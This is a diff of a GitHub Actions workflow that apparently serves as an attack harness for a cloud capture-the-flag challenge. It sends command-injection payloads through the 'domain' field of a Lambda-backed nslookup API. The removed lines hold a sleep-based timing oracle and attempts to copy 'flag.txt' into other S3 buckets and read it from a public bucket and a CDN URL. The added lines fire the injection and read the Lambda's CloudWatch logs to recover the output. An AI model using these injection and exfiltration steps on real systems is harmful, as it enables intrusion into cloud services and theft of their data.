@@ -20,65 +20,52 @@ jobs:
       - name: AWS identity
         run: aws sts get-caller-identity
 
-      # ===== STEP 1: Timing oracle - MOCK vs real AWS integration =====
-      # If response takes ~25s → lambda IS invoked, injection works
-      # If response is instant (<1s) → pure MOCK, lambda never called
-
-      - name: Timing oracle - inject sleep 25
+      - name: Fire injection payload first
         run: |
-          echo "===== TIMING ORACLE: sleep 25 injection ====="
-          START=$(date +%s%3N)
           curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
             -H "Content-Type: application/json" \
-            -d '{"domain":"x; sleep 25"}' \
-            --max-time 30
-          END=$(date +%s%3N)
-          echo ""
-          echo "Response time: $((END - START)) ms"
-          echo "(< 2000ms = MOCK, >= 25000ms = lambda invoked)"
+            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt && cat /tmp/flag.txt"}'
 
-      # ===== STEP 2: S3 exfil - try all 3 buckets as target =====
-      # lambdaRole PutObject may be allowed on a different bucket than platform-bucket
+      - name: Wait for execution and log propagation
+        run: sleep 10
 
-      - name: Inject copy to all 3 buckets
+      - name: Test logs:FilterLogEvents
+        continue-on-error: true
         run: |
-          echo "===== EXFIL ATTEMPT 1: -> codec4f26c862a321ef5 ====="
-          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
-            -H "Content-Type: application/json" \
-            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://codec4f26c862a321ef5/flag_out.txt"}'
+          echo "===== filter-log-events ====="
+          START=$(date -d '10 minutes ago' +%s000)
+          aws logs filter-log-events \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --start-time "$START" \
+            --query 'events[*].message' \
+            --output text
 
-          echo "===== EXFIL ATTEMPT 2: -> platform-bucket ====="
-          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
-            -H "Content-Type: application/json" \
-            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_out.txt"}'
-
-          echo "===== EXFIL ATTEMPT 3: -> site781fe43f26b9eba3 ====="
-          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
-            -H "Content-Type: application/json" \
-            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag_out.txt"}'
-
-      - name: Wait for lambda executions
-        run: sleep 15
-
-      # ===== STEP 3: Check with s3 ls (confirmed working under Statement2) =====
-
-      - name: Check all buckets for flag_out.txt via s3 ls
+      - name: Test logs:DescribeLogStreams
+        continue-on-error: true
         run: |
-          echo "===== ls codec4f26c862a321ef5 ====="
-          aws s3 ls s3://codec4f26c862a321ef5/ --recursive
+          echo "===== describe-log-streams ====="
+          aws logs describe-log-streams \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --order-by LastEventTime --descending --limit 3
 
-          echo "===== ls platform-bucket ====="
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --recursive
-
-          echo "===== ls site781fe43f26b9eba3 ====="
-          aws s3 ls s3://site781fe43f26b9eba3/ --recursive
-
-      # ===== STEP 4: If flag appeared - read it =====
-
-      - name: Try reading flag_out from public bucket (no creds needed)
+      - name: Test logs:GetLogEvents from latest stream
+        continue-on-error: true
         run: |
-          echo "===== curl platform-bucket/flag_out.txt ====="
-          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag_out.txt"
-          echo ""
-          echo "===== curl cloudfront/flag_out.txt (site bucket via IL-accessible CDN) ====="
-          curl -s "https://d67nf28gqfurd.cloudfront.net/flag_out.txt"
+          echo "===== get-log-events ====="
+          STREAM=$(aws logs describe-log-streams \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --order-by LastEventTime --descending --limit 1 \
+            --query 'logStreams[0].logStreamName' --output text 2>/dev/null)
+          echo "Stream: $STREAM"
+          aws logs get-log-events \
+            --log-group-name /aws/lambda/nslookupv2 \
+            --log-stream-name "$STREAM" \
+            --query 'events[*].message' \
+            --output text
+
+      - name: Test logs:DescribeLogGroups
+        continue-on-error: true
+        run: |
+          echo "===== describe-log-groups ====="
+          aws logs describe-log-groups \
+            --log-group-name-prefix /aws/lambda/nslookupv2
